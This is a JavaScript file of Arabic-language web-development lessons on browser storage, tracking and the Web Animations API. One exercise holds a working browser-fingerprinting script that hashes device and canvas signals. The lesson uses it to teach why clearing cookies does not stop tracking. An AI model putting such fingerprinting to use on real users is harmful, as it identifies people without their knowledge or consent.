**IndexedDB** قاعدة بيانات: object stores (زي الجداول) و indexes و transactions، وبتخزّن أي حاجة [[structuredClone]] يقدر ينسخها (حتى [[Blob]]). الـ API نفسه بالأحداث (قديم وتقيل)، فالناس بتستخدم مكتبة صغيرة زي [[idb]]. شرحها كامل في درس «IndexedDB و BroadcastChannel».

**[[navigator.storage]]:** [[estimate()]] بيقولك مستخدم كام ومسموح كام، و [[usageDetails]] (Chrome) مقسّم على الأنواع. Cache و IndexedDB والـ service workers بيتحسبوا من نفس الـ quota. Web Storage والكوكيز ليهم حدودهم الصغيرة لوحدهم.

---

## ٣. المسح: مين بيمسح إيه

- **اليوزر:** «Clear browsing data»، أو Application ثم Clear site data (درس «Clear site data»)، أو الوضع الخفي (كله بيتمسح مع القفل).
- **المتصفح لوحده (eviction):** لو الديسك قرّب يتملا، المتصفح بيمسح تخزين المواقع الأقل استخدامًا (Cache و IndexedDB و Web Storage مع بعض للـ origin كله). [[await navigator.storage.persist()]] بيطلب استثناء: Chrome بيوافق لوحده للمواقع اللي اليوزر بيستخدمها كتير أو متسطبة (PWA)، وإلا بيرجّع [[false]] زي ما حصل هنا.
- **Safari:** بيمسح تخزين الـ script (Web Storage و IndexedDB و Cache) لموقع اليوزر مفتحهوش ٧ أيام (ده من وثايق WebKit، متجرّبش هنا).
- **السيرفر:** header [[Clear-Site-Data: "cache", "cookies", "storage"]] في رد تسجيل الخروج.

**النتيجة:** أي حاجة في المتصفح **كاش**، مش المصدر الوحيد. الداتا المهمة مكانها السيرفر، والمتصفح نسخة للسرعة والأوفلاين.

---

## ٤. الجانب الوحش: التتبع

نفس الأدوات دي بتستخدمها شركات الإعلانات عشان تعرف إنك نفس الشخص في مواقع مختلفة.

**أ. الكوكيز الـ third-party:** موقع أخبار فيه [[<script src="https://ads.example/pixel.js">]] أو [[<iframe>]] من نفس شركة الإعلانات. طلب الصورة أو السكربت ده بيروح لـ [[ads.example]] ومعاه **كوكي [[ads.example]]** (third-party: دومين غير الموقع اللي انت فاتحه). نفس الكوكي بتتبعت من موقع الأخبار ومن موقع الماتشات ومن متجر الأحذية، فالشركة بتربط زياراتك كلها بـ id واحد. وده سبب إن [[SameSite=None]] لازم معاه [[Secure]]، وإن [[Lax]] بقى الافتراضي.

**ب. التخزين في iframe:** نفس الفكرة بـ [[localStorage]] جوه iframe من [[ads.example]]. جرّبناها: صفحة على [[127.0.0.1]] حطت [[who=first-party]]، وبعدين صفحة على [[localhost]] (موقع تاني) فيها iframe من [[127.0.0.1]] بيقرا نفس المفتاح:

~~~text الناتج: iframe من 127.0.0.1 جوه صفحة localhost
Chromium اللي Playwright بيشغّله: peek in iframe → who = "first-party" | cookie = ""
Chrome 157 العادي:               peek in iframe → who = null | cookie = ""
~~~

- **في Chrome العادي الـ iframe شاف [[null]]:** ده **storage partitioning**. التخزين جوه الـ iframe متقسّم بالموقع اللي فوق: [[127.0.0.1]] جوه [[localhost]] ليه درج غير [[127.0.0.1]] لوحده. فشركة الإعلانات بقت شايفة درج مختلف في كل موقع، ومتقدرش تربطهم. Firefox و Safari بيعملوا نفس الحكاية.
- **نسخة Chromium بتاعة Playwright شافت القيمة:** نفس رقم الإصدار، بس Playwright بيشغّل Chromium بـ flags خاصة بتقفل features، والأرجح إن الـ partitioning منهم (ده تفسيرنا، اتقاس الفرق بس). الدرس: الاختبار الآلي ممكن ميطابقش متصفح اليوزر، فالحاجات الخاصة بالخصوصية اتأكد منها في متصفح عادي.
- **الكوكي [[""]] في الحالتين:** الكوكي اتعملت من غير [[SameSite]]، فالافتراضي Lax، و Lax مبتتبعتش لـ iframe من موقع تاني.
- **الكوكيز الـ third-party نفسها:** Safari و Firefox بيقفلوها أو بيقسّموها افتراضي. Chrome لسه بيسمح بيها افتراضي واليوزر يقدر يقفلها من الإعدادات. والموقع اللي محتاج كوكي جوه iframe بشكل شرعي (شات دعم مثلًا) بيحط [[Partitioned]] (CHIPS) فتبقى درج منفصل لكل موقع فوق.

**ج. الـ fingerprinting:** من غير ما يخزّن حاجة خالص. كل سكربت بيقدر يقرا حاجات زي الـ user agent واللغات والـ time zone ومقاس الشاشة وعدد الأنوية، ويرسم نص على [[canvas]] (كارت الشاشة والخطوط بيطلّعوا pixels مختلفة شوية)، ويعمل hash للكل:

~~~text الناتج: تمرين ٣ (Chrome 157)
languages   en-US,en
timeZone    Africa/Cairo
screen      1280x720@1.0000000149011612
cores       16
touch       0
colorScheme light
canvas      4698
بصمة: (١٦ حرف hex، طلعت هي هي في التلات مرات)
~~~

البصمة طلعت **نفسها** بعد ما مسحنا الكوكيز والـ [[localStorage]]، وعلى origin تاني ([[127.0.0.1]]). مسح الكوكيز مش بيوقفها. المتصفحات بتقاوم بإنها تقلل التفاصيل (Chrome ثبّت أرقام الـ user agent، و Safari و Firefox بيرجّعوا قيم موحّدة أو فيها noise في وضع الحماية)، ومش حاجة تقدر تتحكم فيها من موقعك.

**كمطوّر:** متعملش تتبع بنفسك، وخلي بالك من السكربتات اللي بتحطها من برّه (analytics و ads و chat widgets): كلها شغالة بنفس صلاحيات كودك، بتقرا نفس الكوكيز ونفس [[localStorage]]. وقوانين زي GDPR بتطلب موافقة قبل أي كوكي أو تخزين مش ضروري لشغل الموقع.

---

## الخلاصة

| السؤال | الإجابة |
|---|---|
| السيرفر محتاجه في الطلب؟ | كوكي (و [[HttpOnly]] لو JS مش محتاجه) |
| صغير وبيعيش بعد الـ reload؟ | [[localStorage]] |
| للتاب ده بس؟ | [[sessionStorage]] |
| صفحات وملفات للأوفلاين؟ | Cache API |
| كتير، أو ملفات، أو من worker؟ | IndexedDB |
| سر؟ | السيرفر بس |

اللي ميتلخبطش: أي حاجة في المتصفح ممكن تتمسح، فهي كاش مش مصدر. والكوكيز بتتقل كل طلب. والـ partitioning والـ fingerprinting سبب إن «امسح الكوكيز» مش خصوصية كاملة.`,
          lines: [
            R`المستخدم قبل أي حاجة: [[estimate()]] بترجّع Promise فيها [[usage]] و [[quota]] بالبايت`,
            R`بنفتح (أو نعمل) كاش اسمه [[lab-v1]]: Cache API async ومن غير حد صغير`,
            R`بنخزّن رد فيه ميجا بايت أصفار تحت العنوان [[/big]]`,
            R`نقيس تاني، و [[usageDetails]] (Chrome) بتقسّم الاستخدام على الأنواع`,
            R`بيطبع صفر، وحوالي ميجا، و [[{ caches: ... }]]، والـ quota بالجيجا`,
            R`[[persisted()]]: هل المتصفح وعد إنه مش هيمسح التخزين ده لوحده؟ و [[caches.keys()]] أسامي الكاشات`,
            R`بنمسح الكاش عشان التجربة متسيبش حاجة`,
          ],
          practice: [
            { lvl: 'سريع', t: R`**اختار:** لكل حالة من دول اختار مكان التخزين وسبب في سطر: (١) كوكي الـ session بعد اللوجين، (٢) لغة الموقع والسيرفر بيرسم الصفحة بيها، (٣) مسودة تعليق طويل، (٤) خطوة ٢ من ٤ في فورم حجز في التاب ده، (٥) ٣٠٠ صورة منتج للأوفلاين، (٦) ٢٠٠٠ رسالة شات مع البحث فيها، (٧) رقم الكارت عشان «احفظ للمرة الجاية» (من قسم ١ في الشرح).`, done: R`٧ إجابات، و (٧) «ولا مكان في المتصفح».`, sol: R`**إجابة نموذجية:**

| # | المكان | ليه |
|---|---|---|
| ١ | كوكي من السيرفر [[HttpOnly; Secure; SameSite=Lax]] | بتتبعت لوحدها، و XSS مبيوصلهاش |
| ٢ | كوكي [[lang=ar; max-age=31536000; path=/]] | السيرفر محتاجها في أول طلب قبل أي JS |
| ٣ | [[localStorage]] (بالـ JSON) | صغيرة، وتعيش لو التاب اتقفل غلط |
| ٤ | [[sessionStorage]] | تعيش مع الـ reload، وتاب تاني يبدأ من الأول |
| ٥ | Cache API من service worker | دي ردود HTTP كاملة، والـ SW بيردّ بيها أوفلاين |
| ٦ | IndexedDB بـ index على الوقت والنص | كتير، و async، والبحث بـ index من غير ما تحمّل الكل |
| ٧ | ولا مكان في المتصفح | الكارت عند شركة الدفع، وانت تحفظ token بتاعها في السيرفر |

ليه مش [[localStorage]] لـ ٦: ٢٠٠٠ رسالة = ميجات JSON بتتقري sync كل مرة الصفحة تفتح، والصفحة واقفة. وليه مش كوكي لـ ٣: التعليق ممكن يبقى أطول من ٤٠٩٦ حرف، وهيتبعت مع كل طلب من غير لازمة.` },
            { lvl: 'تطبيق', t: R`**قيس بنفسك:** على صفحة من سيرفر محلي: [[estimate()]] الأول، وبعدين خزّن ميجا في Cache API وقيس، وبعدين ميجا [[Blob]] في IndexedDB وقيس. اطبع [[usageDetails]] و [[persist()]]. وامسح اللي عملته في الآخر (من قسمي ٢ و ٣ في الشرح).`, done: R`الاستخدام زاد حوالي ميجا مع كل خطوة، و [[usageDetails]] فيها [[caches]] و [[indexedDB]]، و [[persist()]] رجّعت [[true]] أو [[false]] وعارف ليه.`, sol: R`~~~js measure.js (module في صفحة من سيرفر محلي)
const mb = n => (n / 1024 / 1024).toFixed(2) + " MB";
const before = (await navigator.storage.estimate()).usage;
const cache = await caches.open("lab-v1");
await cache.put("/big", new Response(new Uint8Array(1024 * 1024)));
const afterCache = await navigator.storage.estimate();
await new Promise((res, rej) => {
  const r = indexedDB.open("lab-db", 1);
  r.onupgradeneeded = () => r.result.createObjectStore("files");
  r.onsuccess = () => {
    const tx = r.result.transaction("files", "readwrite");
    tx.objectStore("files").put(new Blob([new Uint8Array(1024 * 1024)]), "big");
    tx.oncomplete = () => { r.result.close(); res(); };
    tx.onerror = rej;
  };
});
const afterIdb = await navigator.storage.estimate();
console.log("قبل: " + mb(before) + " | بعد Cache: " + mb(afterCache.usage) + " | بعد IndexedDB: " + mb(afterIdb.usage));
console.log("details: " + JSON.stringify(afterIdb.usageDetails));
console.log("quota: " + (afterIdb.quota / 1024 ** 3).toFixed(1) + " GB");
console.log("persist(): " + await navigator.storage.persist());
await caches.delete("lab-v1");
indexedDB.deleteDatabase("lab-db");
~~~

~~~text الناتج (Chrome 157، origin فاضي)
قبل: 0.00 MB | بعد Cache: 1.00 MB | بعد IndexedDB: 2.00 MB
details: {"caches":1049088,"indexedDB":1052336}
quota: 10.0 GB
persist(): false
~~~

- **IndexedDB بالأحداث:** [[onupgradeneeded]] أول مرة بس (عشان نعمل الـ store)، و [[onsuccess]] لما القاعدة تفتح، و [[tx.oncomplete]] لما الكتابة تتأكد. لفّيناهم في Promise زي درس «callbacks و events».
- **[[persist()]] = [[false]]:** origin جديد على localhost ومحدش بيزوره. على موقع متسطب كـ PWA أو بيتزار كتير Chrome بيوافق لوحده.
- **الأرقام فوق الميجا** (١٠٤٩٠٨٨ و ١٠٥٢٣٣٦): التخزين نفسه ليه مصاريف (headers الرد، والـ metadata).
- **أي حاجة في الـ quota ممكن تتمسح** لو الديسك اتملا، فالمسح في الآخر عادة كويسة في التجارب.` },
            { lvl: 'تطبيق', t: R`**دوّر بنفسك:** صفحة بتجمع حاجات زي اللي في قسم ٤-ج: [[userAgent]] و [[languages]] و [[timeZone]] من [[Intl]] و [[screen]] و [[devicePixelRatio]] و [[hardwareConcurrency]] و [[maxTouchPoints]] و [[prefers-color-scheme]] وطول [[canvas.toDataURL()]] لنص مرسوم، وتعمل منهم SHA-256 بـ [[crypto.subtle.digest]] وتعرض أول ١٦ حرف. امسح الكوكيز والـ [[localStorage]] واعمل reload: البصمة اتغيّرت؟ (من قسم ٤ في الشرح).`, done: R`البصمة هي هي بعد المسح وعلى origin تاني، وعرفت إن مفيش ولا حاجة من دول محتاجة إذن.`, sol: R`~~~html fingerprint.html
<pre id="out"></pre>
<script type="module">
const signals = {
  userAgent: navigator.userAgent,
  languages: navigator.languages.join(","),
  timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen: screen.width + "x" + screen.height + "@" + devicePixelRatio,
  cores: navigator.hardwareConcurrency,
  touch: navigator.maxTouchPoints,
  colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
};
const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");
ctx.font = "16px serif";
ctx.fillText("متجر النور ☕ 123", 4, 20);
signals.canvas = canvas.toDataURL().length;

const text = JSON.stringify(signals);
const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
const id = [...new Uint8Array(hash)].slice(0, 8).map(b => b.toString(16).padStart(2, "0")).join("");
const lines = Object.entries(signals).map(([k, v]) => k.padEnd(12) + String(v).slice(0, 60));
document.querySelector("#out").textContent = lines.join("\n") + "\n\nبصمة: " + id;
</script>
~~~

~~~text الناتج (Chrome 157، والـ userAgent متشال من العرض)
languages   en-US,en
timeZone    Africa/Cairo
screen      1280x720@1.0000000149011612
cores       16
touch       0
colorScheme light
canvas      4698

بصمة: (١٦ حرف hex)
~~~

ونفس الـ ١٦ حرف طلعوا ٣ مرات: أول تحميل، وبعد مسح الكوكيز و [[localStorage]] و reload، وعلى [[http://127.0.0.1]] بدل [[localhost]].

- **[[crypto.subtle.digest]]** محتاج secure context (https أو localhost)، وبيرجّع [[ArrayBuffer]] فحوّلناه hex.
- **[[1.0000000149011612]]:** الزوم بتاع البروفايل خلّى الـ [[devicePixelRatio]] رقم مش مدوّر. تفصيلة صغيرة زي دي بتفرّق جهاز عن جهاز أكتر.
- **[[canvas]]:** طول الصورة نفسه بيختلف بين الأجهزة حسب الخطوط وكارت الشاشة. المكتبات الحقيقية بتعمل hash للـ pixels مش الطول، وبتضيف عشرات الحاجات التانية (الخطوط المتسطبة، والصوت، و WebGL).
- **عشان كده** «امسح الكوكيز» مش كفاية لو حد عايز يتتبعك، والحماية الحقيقية في المتصفح نفسه.` },
            { lvl: 'تطبيق', t: R`**ابني:** بـ Cache API من الصفحة (من غير service worker): خزّن [[/hello.txt]] بـ [[cache.add]]، واقطع النت (DevTools: Network ثم Offline)، وجرّب [[fetch]] ثم [[caches.match]]. واكتب [[getText(url)]] بتجرّب الشبكة الأول ولو فشلت ترجع للكاش (من قسم ٢ في الشرح).`, done: R`[[fetch]] أوفلاين رمى [[TypeError: Failed to fetch]]، و [[caches.match]] رجّع النص، و [[getText]] رجّعت النص في الحالتين، وملف مش متخزّن رجّع [[undefined]].`, sol: R`~~~js offline-text.js (صفحة من سيرفر محلي، module)
const cache = await caches.open("offline-v1");
await cache.add("/hello.txt");
console.log((await cache.keys()).map(r => new URL(r.url).pathname).join(","));

async function getText(url) {
  try {
    const res = await fetch(url);
    if (res.ok) {
      (await caches.open("offline-v1")).put(url, res.clone());
      return res.text();
    }
  } catch {}
  const hit = await caches.match(url);
  return hit ? hit.text() : undefined;
}

// اقطع النت هنا (Playwright: context.setOffline(true))
try { await fetch("/hello.txt"); } catch (e) { console.log("fetch: " + e.name + ": " + e.message); }
console.log("cache: " + JSON.stringify(await (await caches.match("/hello.txt")).text()));
console.log("miss: " + String(await caches.match("/nope.txt")));
console.log("getText: " + JSON.stringify(await getText("/hello.txt")));
~~~

~~~text الناتج (Chrome 157، النت اتقطع من Playwright بعد السطر التالت)
/hello.txt
fetch: TypeError: Failed to fetch
cache: "أهلًا من ملف نص\nسطر تاني\n"
miss: undefined
getText: "أهلًا من ملف نص\nسطر تاني\n"
~~~

- **[[res.clone()]]:** الـ body بيتقرا مرة واحدة (درس «REST و CRUD بـ fetch»)، ومحتاجينه مرتين: للكاش ولليوزر.
- **ده «network first»:** الشبكة الأول عشان الداتا تبقى جديدة، والكاش احتياطي. الاستراتيجيات التانية (cache first، stale-while-revalidate) في درس «استراتيجيات الكاش».
- **من غير service worker** ده بينفع لداتا تجيبها بـ [[fetch]] بس. عشان الصفحة نفسها تفتح أوفلاين لازم SW.
- **[[catch {}]] الفاضي هنا مقصود:** أي فشل شبكة = روح للكاش.` },
          ],
          ref: [
            { t: "MDN Learn: Client-side storage", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Client-side_APIs/Client-side_storage" },
            { t: "MDN: Cache", url: "https://developer.mozilla.org/en-US/docs/Web/API/Cache" },
            { t: "MDN: IndexedDB API", url: "https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" },
            { t: "MDN: StorageManager.estimate()", url: "https://developer.mozilla.org/en-US/docs/Web/API/StorageManager/estimate" },
            { t: "MDN: Storage quotas and eviction criteria", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria" },
            { t: "MDN: State Partitioning", url: "https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/State_Partitioning" },
            { t: "MDN: Third-party cookies", url: "https://developer.mozilla.org/en-US/docs/Web/Privacy/Guides/Third-party_cookies" },
            { t: "MDN: Fingerprinting", url: "https://developer.mozilla.org/en-US/docs/Glossary/Fingerprinting" },
          ],
          pre: [{ to: "js/IndexedDB و BroadcastChannel", why: R`IndexedDB بالتفصيل: stores و indexes و transactions` }, { to: "js/استراتيجيات الكاش", why: R`Cache API من الـ service worker وإزاي تختار استراتيجية` }, { to: "js/دورة حياة الـ SW", why: R`الـ service worker اللي بيستخدم Cache API عشان الموقع يفتح أوفلاين` }, { to: "web/Clear site data", why: R`تمسح كل تخزين الموقع من DevTools وانت بتجرّب` }],
          deep: {
            why: R`الاختيار الغلط بيبان متأخر: موقع بطيء لأن [[localStorage]] فيه ميجات، أو لوجين اتسرق لأن التوكن في مكان JS بيشوفه، أو داتا اليوزر راحت لأن المتصفح مسح التخزين. والـ MDN Curriculum بيطلب كمان تعرف الجانب الأخلاقي: نفس الأدوات بتتستخدم للتتبع.`,
            how: R`كل نوع ليه storage منفصل في البروفايل، والـ Cache و IndexedDB و Web Storage متجمّعين تحت «storage bucket» واحد لكل origin (أو لكل origin + الموقع اللي فوق لو جوه iframe: ده الـ partitioning). الـ quota بتتحسب على الـ bucket ده، والـ eviction بيمسحه كله مرة واحدة. والكوكيز في jar منفصل بقواعد [[SameSite]] و [[Partitioned]].`,
            when: R`ابدأ بالسؤال: «السيرفر محتاجه في الطلب؟» (كوكي). «صغير وبسيط؟» (Web Storage). «طلبات وردود؟» (Cache). «كتير أو ملفات أو worker؟» (IndexedDB). وقبل أي سكربت third-party اسأل: هيقرا إيه من التخزين ده، ومحتاج موافقة اليوزر؟`,
            mistakes: R`داتا كبيرة في [[localStorage]]. أسرار في أي مكان في المتصفح. الاعتماد على إن التخزين مش هيتمسح. كوكيز تقيلة. افتراض إن iframe هيشوف نفس التخزين بتاعه في كل المواقع. اختبار الخصوصية في متصفح آلي بإعدادات مختلفة بس. سكربتات third-party من غير ما تعرف بتقرا إيه.`,
          },
        },
        {
          cmd: "Web Animations API: element.animate",
          title: "نفس الـ @keyframes بتاعة CSS بس من JavaScript: animation تشغّلها وتوقفها وتعكسها وتستنى تخلص",
          desc: R`[[element.animate(keyframes, options)]] بيعمل animation زي [[@keyframes]] بتاعة CSS، بس من الكود، ويرجّعلك object [[Animation]] تتحكم فيه: [[play()]] و [[pause()]] و [[reverse()]] و [[finish()]] و [[cancel()]]، و [[currentTime]] و [[playbackRate]]، و [[finished]] (Promise بتتحل لما تخلص). وكمان [[document.getAnimations()]] بيرجّع كل الـ animations في الصفحة، حتى اللي عاملها CSS، فتقدر توقفها أو تستناها من JS.
• الـ keyframes: array من objects ([[[{ opacity: 0 }, { opacity: 1 }]]]) أو object فيه arrays ([[{ opacity: [0, 1] }]])، والخصايص بأسامي JS ([[backgroundColor]]).
• الـ options: [[duration]] (ms) و [[easing]] و [[delay]] و [[iterations]] و [[direction]] و [[fill]] و [[id]].
• استخدمه للحركة اللي بتتحسب وقت التشغيل أو محتاجة تحكم أو تستنى نهايتها، وخلي الباقي CSS. ولو اليوزر طالب [[prefers-reduced-motion]]: قللها أو شيلها.`,
          example: R`const box = document.querySelector("#a");
const anim = box.animate(
  [{ transform: "translateX(0)" }, { transform: "translateX(-200px)", opacity: 0.5 }],
  { duration: 1000, easing: "ease-out", fill: "forwards", id: "slide" }
);
console.log(anim.playState, anim.id, anim.effect.getTiming().duration);
anim.pause();
anim.currentTime = 500;
console.log(anim.currentTime, anim.playState, getComputedStyle(box).transform);
anim.playbackRate = 4;
anim.play();
await anim.finished;
console.log(anim.playState, getComputedStyle(box).transform, getComputedStyle(box).opacity);`,
          try: R`بعد المثال، اعمل [[anim.reverse()]] واستنى [[anim.finished]]: الصندوق رجع فين و [[currentTime]] بقى كام؟ وبعدين [[const x = box.animate({ opacity: [1, 0] }, 1000); x.finished.catch(e => console.log(e.name)); x.cancel();]]: إيه اللي اتطبع و [[x.playState]] بقت إيه؟`,
          sol: R`~~~text الناتج (Chrome 157، [[<script type="module">]])
reversed: finished 0 none
after cancel: idle
cancel: AbortError The user aborted a request.
~~~

- **[[reverse()]]** قلب الاتجاه وشغّل: رجع لـ [[currentTime]] صفر، والـ [[transform]] بقى [[none]] (الـ [[fill: "forwards"]] بيمسك آخر frame بس لما بيخلص للأمام).
- **[[cancel()]]** شال تأثير الـ animation خالص ورجّع [[playState]] [["idle"]]، و **[[finished]] اترفضت** بـ [[AbortError]]. لو مكتبتش [[.catch]] هيطلع «Uncaught (in promise)» في الـ Console.
- «after cancel» اتطبع قبل «cancel: AbortError» لأن الـ [[.catch]] async (microtask).`,
          teach: R`## الفكرة

في CSS بتكتب الحركة مرة وبتشتغل لوحدها (درس «transition و @keyframes»). بس ساعات محتاج:

- الأرقام تتحسب وقت التشغيل (روح من مكان الضغطة، اطلع بمقدار عرض العنصر).
- تتحكم: وقّف، اعكس، أسرع، اقفز لنص الحركة.
- تعرف إمتى خلصت عشان تعمل حاجة بعدها (امسح العنصر، ابدأ اللي بعدها).

ده الـ Web Animations API (WAAPI). وهو نفس المحرك اللي بيشغّل CSS animations: نفس الـ keyframes ونفس الـ easing ونفس الأداء. كل النواتج من Chrome 157 على صفحة من سيرفر محلي.

---

## ١. [[element.animate(keyframes, options)]]

~~~text الناتج: سطر ٦ في المثال
running slide 1000
~~~

**الـ keyframes** = الـ [[@keyframes]] بتاعة CSS كـ array:

~~~js
// CSS:  @keyframes slide { from { transform: translateX(0) } to { transform: translateX(-200px); opacity: .5 } }
[{ transform: "translateX(0)" }, { transform: "translateX(-200px)", opacity: 0.5 }]
// نفس الحكاية بشكل تاني: object فيه array لكل خاصية
{ transform: ["translateX(0)", "translateX(-200px)"], opacity: [1, 0.5] }
~~~

- الخصايص بأسامي JS: [[backgroundColor]] مش [[background-color]]، و [[float]] تتكتب [[cssFloat]].
- [[offset]] (من ٠ لـ ١) بيحط الـ keyframe في نسبة معينة زي [[50%]] في CSS. لو مش متكتب بيتوزّعوا بالتساوي. وترتيبه لازم يزيد: [[[{ offset: 0.8 }, { offset: 0.2 }]]] بيرمي [[TypeError: Failed to execute 'animate' on 'Element': Offsets must be monotonically non-decreasing.]]
- ممكن keyframe واحد بس أو خصايص مش في كل الـ keyframes ([[[{ transform: "none" }, { color: "red" }]]] اشتغلت): المتصفح بيكمّل من القيمة الحالية.

**الـ options** (لو حطيت رقم بس بدل object يبقى [[duration]]):

| الـ option | في CSS | مثال |
|---|---|---|
| [[duration]] | [[animation-duration]] بس بالـ ms | [[400]]. سالب = [[TypeError: ... duration must be non-negative or auto]] |
| [[easing]] | [[animation-timing-function]] | [["ease-out"]] و [["cubic-bezier(.2,.8,.2,1)"]] و [["steps(4)"]]. [["bounce"]] = [[TypeError: ... 'bounce' is not a valid value for easing]] |
| [[delay]] و [[endDelay]] | [[animation-delay]] | [[200]] |
| [[iterations]] | [[animation-iteration-count]] | [[3]] أو [[Infinity]] |
| [[direction]] | [[animation-direction]] | [["alternate"]] |
| [[fill]] | [[animation-fill-mode]] | [["forwards"]] (افضل على آخر frame) و [["both"]] |
| [[composite]] | [[animation-composition]] | [["add"]]: تزوّد على التحويل الموجود |
| [[id]] | اسم تلاقيه بيه | [["slide"]] |

---

## ٢. الـ [[Animation]] object: التحكم

~~~text الناتج: المثال كله
running slide 1000
500 paused matrix(1, 0, 0, 1, -136.929, 0)
finished matrix(1, 0, 0, 1, -200, 0) 0.5
~~~

| | بيعمل |
|---|---|
| [[play()]] و [[pause()]] | يشغّل ويوقف |
| [[reverse()]] | يعكس الاتجاه ويشغّل ([[playbackRate]] بيبقى بالسالب) |
| [[finish()]] | يقفز للآخر |
| [[cancel()]] | يشيل التأثير خالص، و [[finished]] بترفض بـ [[AbortError]] |
| [[currentTime]] | فين في الحركة بالـ ms، وتقدر تكتبه (scrubbing) |
| [[playbackRate]] | السرعة: [[2]] أسرع، [[0.5]] أبطأ، [[-1]] بالعكس. [[updatePlaybackRate()]] بتغيّرها من غير قفزة |
| [[playState]] | [["idle"]] و [["running"]] و [["paused"]] و [["finished"]] |
| [[finished]] | Promise بتتحل لما تخلص (وفيه [[onfinish]] و [[oncancel]] لو عايز حدث) |
| [[commitStyles()]] | يكتب القيم الحالية في [[style]] العنصر |

**ليه [[-136.929]] مش [[-100]] في نص الوقت:** [[easing: "ease-out"]] بيمشي بسرعة في الأول ويبطّأ في الآخر، فعند ٥٠٠ ms (نص المدة) الصندوق قطع حوالي ٦٨٪ من المسافة. مع [["linear"]] كان هيبقى [[-100]] بالظبط.

**[[await anim.finished]]** هو أهم حاجة في الـ API: تعمل الحاجة بعد الحركة من غير [[setTimeout]] بنفس المدة (اللي بيبوظ لو المدة اتغيّرت أو التاب اتخفى). المثال الكلاسيكي: امسح العنصر بعد ما يختفي:

~~~js
const out = li.animate([{ opacity: 1 }, { opacity: 0 }], { duration: 200, fill: "forwards" });
await out.finished;
li.remove();
~~~

---

## ٣. [[fill]] و [[commitStyles()]]: العنصر بيرجع لمكانه

من غير [[fill]] الحركة بتخلص والعنصر **بيرجع** لشكله في الـ CSS، لأن الـ animation طبقة فوق الـ style مش تعديل فيه. الحلول:

| | النتيجة | العيب |
|---|---|---|
| [[fill: "forwards"]] | بيفضل على آخر frame | الـ animation فاضلة شغالة وماسكة الخاصية، ولو غيّرت [[style]] بعدين مش هيبان |
| [[commitStyles()]] ثم [[cancel()]] | القيمة اتكتبت في [[style]] والـ animation اتشالت | سطرين زيادة |
| تغيّر [[style]] قبل [[animate]] | الشكل النهائي في الـ CSS، والـ animation من القديم للجديد | لازم تعرف البداية |

~~~text الناتج: scale بـ fill: "forwards"، وبعد finished: commitStyles() ثم cancel()
commitStyles: scale(1.5) 0
~~~

[[box.style.transform]] بقى [["scale(1.5)"]] و [[box.getAnimations().length]] = [[0]]: الشكل ثابت ومفيش animation فاضلة.

---

## ٤. [[getAnimations()]]: CSS و WAAPI نفس الحاجة

صفحة فيها عنصر عليه [[animation: spin 2s linear infinite]] (CSS)، وعنصر عليه [[transition: opacity 1s]] واتغيّرت الـ opacity:

~~~text الناتج
CSSTransition:opacity, CSSAnimation:spin
running
paused
~~~

[[document.getAnimations()]] رجّع animation الـ CSS و الـ transition كـ objects (والـ transition اتعملت بعد [[getComputedStyle]] على العنصر، تمرين ٥ بيشرح ليه) ([[CSSAnimation]] و [[CSSTransition]] بيورثوا من [[Animation]])، وعملنا [[pause()]] لـ animation الـ CSS من JS. يعني تقدر:

- تستنى transition CSS تخلص: [[await Promise.all(el.getAnimations().map(a => a.finished))]].
- توقف كل الحركة في الصفحة: [[document.getAnimations().forEach(a => a.pause())]].

---

## ٥. CSS ولا WAAPI؟

| استخدم CSS لما | استخدم WAAPI لما |
|---|---|
| الحركة ثابتة ومعروفة (hover، loading spinner، ظهور) | الأرقام بتتحسب وقت التشغيل (من مكان الضغطة، FLIP) |
| مربوطة بحالة (class اتضاف، [[:hover]]) | محتاج تتحكم: pause و reverse و السرعة و scrubbing |
| مش محتاج تعرف إمتى خلصت | محتاج تستنى النهاية ([[finished]]) |
| كل الـ variants في ملف CSS | animation لعنصر اتعمل من JS (toast، item اتضاف) |

الاتنين بيشتغلوا على الـ compositor (من غير ما يوقفوا الـ main thread) لو بتحرّك [[transform]] و [[opacity]] بس. حرّك [[left]] أو [[width]] وهيبقى أتقل في الاتنين. والمكتبات الكبيرة (Motion و GSAP) مبنية على نفس الأفكار، و Motion بيستخدم WAAPI جوه.

---

## ٦. [[prefers-reduced-motion]]

ناس كتير بيدوخوا أو بيتشتتوا من الحركة، وبيفعّلوا «قلّل الحركة» في النظام. CSS بيقراها بـ [[@media (prefers-reduced-motion: reduce)]] (درس «تكبير الخط و prefers-reduced-motion»)، و JS بـ [[matchMedia]]:

~~~js
const calm = matchMedia("(prefers-reduced-motion: reduce)");
const frames = calm.matches ? [{ opacity: 0 }, { opacity: 1 }] : [{ opacity: 0, transform: "translateY(16px)" }, { opacity: 1, transform: "none" }];
~~~

القاعدة: الحركة اللي بتشرح حاجة (عنصر بيختفي) تفضل بس أهدى (fade بدل slide). الزينة والاهتزاز تتشال. اتقاس في تمرين ٤ ومشروع الإشعارات: مع [[reducedMotion: "reduce"]] من Playwright، الـ keyframes بقت من غير [[transform]] والاهتزاز ماتعملش خالص.

**الـ preview الحي في الموقع ده** بيشغّل [[element.animate]] عادي (sandbox بيسمح بيه)، فالتمارين اللي تحت بتتجرّب في الصفحة نفسها.

---

## الخلاصة

| عايز | اكتب |
|---|---|
| حركة من JS | [[el.animate([{...}, {...}], { duration, easing, fill })]] |
| تعمل حاجة بعدها | [[await anim.finished]] |
| تتحكم | [[pause()]] و [[play()]] و [[reverse()]] و [[finish()]] و [[cancel()]] |
| تفضل على الآخر | [[fill: "forwards"]]، أو [[commitStyles()]] ثم [[cancel()]] |
| animations الـ CSS من JS | [[el.getAnimations()]] |
| تحترم اليوزر | [[matchMedia("(prefers-reduced-motion: reduce)")]] |

اللي ميتلخبطش: الـ animation طبقة فوق الـ style فالعنصر بيرجع من غير [[fill]]، و [[cancel()]] بيرفض [[finished]]، و [[duration]] بالـ ms، وحرّك [[transform]] و [[opacity]].`,
          lines: [
            R`بنجيب الصندوق اللي هنحرّكه من الصفحة بالـ id بتاعه`,
            R`[[animate]] بترجّع [[Animation]] object على طول، والحركة بتبدأ لوحدها`,
